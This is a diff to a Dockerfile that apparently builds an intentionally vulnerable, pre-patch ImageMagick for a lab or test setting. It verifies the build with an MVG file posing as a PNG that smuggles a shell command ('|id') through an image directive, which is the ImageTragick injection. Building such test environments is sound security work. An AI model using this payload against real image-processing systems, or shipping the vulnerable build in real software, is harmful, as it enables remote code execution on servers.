@@ -25,9 +25,9 @@ RUN ./configure --without-magick-plus-plus --disable-static --without-modules \
 
 # Verify this is genuinely the pre-patch, RCE-capable build before shipping it.
 RUN convert -version | grep -q "6.9.3-9"
-RUN printf "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 '|touch /tmp/build_verify_proof'\npop graphic-context\n" > /tmp/verify.png \
+RUN printf "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 '|id > /tmp/build_verify_proof'\npop graphic-context\n" > /tmp/verify.png \
     && (convert /tmp/verify.png /tmp/verify_out.png || true) \
-    && test -f /tmp/build_verify_proof \
+    && grep -q "uid=" /tmp/build_verify_proof \
     && rm -f /tmp/build_verify_proof /tmp/verify.png /tmp/verify_out.png
 
 
